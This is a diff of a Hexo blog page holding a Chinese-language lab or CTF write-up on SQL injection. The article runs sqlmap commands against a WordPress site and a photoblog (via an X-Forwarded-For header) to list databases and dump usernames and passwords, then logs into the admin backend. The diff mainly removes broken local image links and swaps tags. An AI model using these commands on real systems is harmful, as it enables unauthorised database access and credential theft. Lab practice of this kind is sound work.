@@ -25,22 +25,12 @@
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="SQL注入SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。 SQL注入的产生原因通常表现在以下几方面:①不当的类型处理;②不安全的数据库配置;③不合理的查询集处理;④不当的错误处理;⑤转义字符处理不合适;⑥多个提交处理不当。 1.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421233219892.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240426114353304.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240426114506297.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240426114626648.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240426114736334.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240428230128709.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240428230456334.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240428230718972.png">
-<meta property="og:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240428230846345.png">
 <meta property="article:published_time" content="2024-09-11T10:55:25.000Z">
-<meta property="article:modified_time" content="2024-09-11T11:06:25.269Z">
+<meta property="article:modified_time" content="2024-09-11T14:06:02.421Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="ctf">
 <meta property="article:tag" content="sql">
+<meta property="article:tag" content="CTF">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="c:\Users\%E9%99%88%E6%80%A1%E7%94%BA\AppData\Roaming\Typora\typora-user-images\image-20240421233219892.png">
     
     
         <!-- Google tag (gtag.js) -->
@@ -64,7 +54,7 @@
         
             sql注入（IP命令行） -
         
-        Dunm1e&#39;World
+        Dunm1e &#39; World
     </title>
 
     
@@ -104,7 +94,7 @@
 
     <script id="hexo-configurations">
     window.config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"};
-    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e'World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e'World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["Lv1","Lv2","Lv3","Lv4","Lv5","Lv6","Lv7","Lv8","Lv9","Lv10"]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐文章","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":true},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"Welcome to Dunm1e ' World!"},"open_graph":true,"google_analytics":{"enable":true,"id":"G-B18L9QTZ0H"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/light.jpg","dark":"/images/dark.jpg"},"title":"Dunm1e ' World","subtitle":{"text":["Loading..."],"hitokoto":{"enable":true,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"style":"default","links":{"github":"https://github.com/dunm1e","instagram":null,"zhihu":null,"twitter":null,"email":"dunxiongdun@gmail.com"},"qrs":{"weixin":"/images/wechat.jpg"}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.7.1","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Github":{"path":"https://github.com/dunm1e","icon":"fa-brands fa-github"},"Links":{"icon":"fa-regular fa-link","submenus":{"Categories":"/categories","Tags":"/tags","Friends":"/links"}}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":"有疑问请联系我的邮箱","show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/9/11 12:00:00"};
     window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
     window.data = {"masonry":false};
   </script>
@@ -214,7 +204,7 @@
 
 <div class="preloader">
     <h2 class="ml13">
-        Welcome to Dunm1e&#39;World!
+        Welcome to Dunm1e &#39; World!
     </h2>
     <script>
         var textWrapper = document.querySelector('.ml13');
@@ -305,7 +295,7 @@
             
             <a class="logo-title" href="/">
                 
-                Dunm1e&#39;World
+                Dunm1e &#39; World
                 
             </a>
         </div>
@@ -560,8 +550,8 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2024-09-11 19:06:25</span>
-            <span class="mobile">2024-09-11 19:06:25</span>
+            <span class="desktop">2024-09-11 22:06:02</span>
+            <span class="mobile">2024-09-11 22:06:02</span>
             <span class="hover-info">Updated</span>
         </span>
     
@@ -599,11 +589,11 @@
             <ul>
                 
                     <li>
-                        <a href="/tags/ctf/">ctf</a>&nbsp;
+                        <a href="/tags/sql/">sql</a>&nbsp;
                     </li>
                 
                     <li>
-                        | <a href="/tags/sql/">sql</a>&nbsp;
+                        | <a href="/tags/CTF/">CTF</a>&nbsp;
                     </li>
                 
             </ul>
@@ -646,12 +636,6 @@
 <h2 id="3-漏洞扫描"><a href="#3-漏洞扫描" class="headerlink" title="3.漏洞扫描"></a>3.漏洞扫描</h2><blockquote>
 <p>web漏洞扫描器 owasp-zap<br>OWASP ZAP攻击代理服务器是世界上最受欢迎的免费安全工具之一。ZAP可以帮助您在开发和测试应用程序过程中，自动发现 Web应用程序中的安全漏洞。另外，它也是一款提供给具备丰富经验的渗透测试人员进行人工安全测试的优秀工具。</p>
 </blockquote>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240421233219892.png"
-                      alt="image-20240421233219892"
-                ></p>
 <p>输入ip进行attack，然后软件开始爬虫并扫描</p>
 <h2 id="4-漏洞利用"><a href="#4-漏洞利用" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h2><h3 id="4-1-发现高危漏洞sql注入"><a href="#4-1-发现高危漏洞sql注入" class="headerlink" title="4.1 发现高危漏洞sql注入"></a>4.1 发现高危漏洞sql注入</h3><p>对扫描结果进行分析，发现高危漏洞SQL注入</p>
 <p>利用sqlmap利用SQL注入漏洞</p>
@@ -672,36 +656,20 @@
 <h4 id="4-2-1-抓取数据包"><a href="#4-2-1-抓取数据包" class="headerlink" title="4.2.1 抓取数据包"></a>4.2.1 抓取数据包</h4><p>利用bp抓取网页数据包，注意设置浏览器代理，然后将抓取的数据包保存到request.raw文件里</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 --dbs --dbms mysql --batch</span><br><span class="line"># -r参数用于指定 SQLMap 工具所使用的 HTTP 请求文件</span><br><span class="line"># --level 5 表示最高级别的攻击。</span><br><span class="line"># --risk 3 表示非常高的风险。</span><br><span class="line"># --dbs: 这个选项表示 SQLMap 将尝试获取目标数据库的信息。</span><br><span class="line"># --dbms mysql: 这个选项指定了目标数据库管理系统的类型，这里是 MySQL。</span><br><span class="line"># --batch: 这个选项指定了在批处理模式下运行 SQLMap，即不需要用户交互。</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114353304.png"
-                      alt="image-20240426114353304"
-                ></p>
+
+
 <h4 id="4-2-2-进行sql注入"><a href="#4-2-2-进行sql注入" class="headerlink" title="4.2.2 进行sql注入"></a>4.2.2 进行sql注入</h4><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 --tables --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114506297.png"
-                      alt="image-20240426114506297"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users --columns --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114626648.png"
-                      alt="image-20240426114626648"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r request.raw --level 5 --risk 3 -D wordpress8080 -T users -C username,password --dbms mysql --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240426114736334.png"
-                      alt="image-20240426114736334"
-                ></p>
+
+
 <p>得到用户名和密码</p>
 <p>因为前面信息扫描出&#x2F;wordpress 目录，所以可以确定网站利用wordpress的CMS，然后wordpress的默认登录后台页面为</p>
 <p><code>/wordpress/wp-login.php</code></p>
@@ -734,36 +702,20 @@
 <h3 id="5-2-漏洞利用"><a href="#5-2-漏洞利用" class="headerlink" title="5.2 漏洞利用"></a>5.2 漏洞利用</h3><p>利用sqlmap</p>
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230128709.png"
-                      alt="image-20240428230128709"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; --tables --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230456334.png"
-                      alt="image-20240428230456334"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230718972.png"
-                      alt="image-20240428230718972"
-                ></p>
+
+
 <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://靶场IP&quot; --header=&quot;X-Forwarded-For:*&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure></div>
 
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="C:\Users\陈怡町\AppData\Roaming\Typora\typora-user-images\image-20240428230846345.png"
-                      alt="image-20240428230846345"
-                ></p>
+
+
 <p>成功获取用户名和密码，登录到后台</p>
 
         </div>
@@ -779,7 +731,7 @@
         
             <li>
                 <strong>Updated at
-                    :</strong> 2024-09-11 19:06:25
+                    :</strong> 2024-09-11 22:06:02
             </li>
         
         <li>
@@ -805,11 +757,11 @@
             <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/ctf/">#ctf</a>&nbsp;
+                        <a href="/tags/sql/">#sql</a>&nbsp;
                     </li>
                 
                     <li class="tag-item mx-0.5">
-                        <a href="/tags/sql/">#sql</a>&nbsp;
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
                     </li>
                 
             </ul>
